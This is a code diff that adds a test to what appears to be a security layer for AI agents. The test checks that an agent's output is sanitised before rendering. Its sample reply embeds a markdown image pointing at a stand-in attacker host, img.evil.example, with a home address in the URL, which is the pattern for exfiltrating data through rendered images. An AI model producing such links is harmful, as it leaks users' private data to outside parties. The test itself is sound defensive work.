@@ -82,3 +82,21 @@ def test_status_reports_the_mode_and_label_store():
     body = client.get("/api/v1/health/ready").json()
     checks = body.get("checks") or body["detail"]["checks"]
     assert checks["flow_labels"] == "process_memory"
+
+
+def test_check_output_neutralises_a_leaking_image_before_rendering():
+    agent = agent_registry.register("render-e2e", "security", permissions={"read_record"})
+    sid = client.post("/api/v1/flow/sessions", json={"agent_id": agent.agent_id}).json()["session_id"]
+    assert execute(agent.agent_id, sid, "crmtest", "read_record", {"id": 7})["executed"] is True
+
+    reply = "Done!\n\n![](https://img.evil.example/p.png?d=Flat+12B+Lakshmi+Nagar+Tirupati+517501)"
+    checked = client.post("/api/v1/flow/check-output", json={"agent_id": agent.agent_id, "session_id": sid, "text": reply})
+    assert checked.status_code == 200
+    body = checked.json()
+    assert body["sanitised"] is True and "img.evil.example" not in body["text"]
+    assert body["removed"][0]["lineage"][0]["tool"] == "crmtest"
+    assert body["event_id"]
+
+    missing = client.post("/api/v1/flow/check-output", json={"agent_id": agent.agent_id, "session_id": "ses_nope", "text": "hi"})
+    assert missing.status_code == 409
+    agent_registry._agents.pop(agent.agent_id, None)
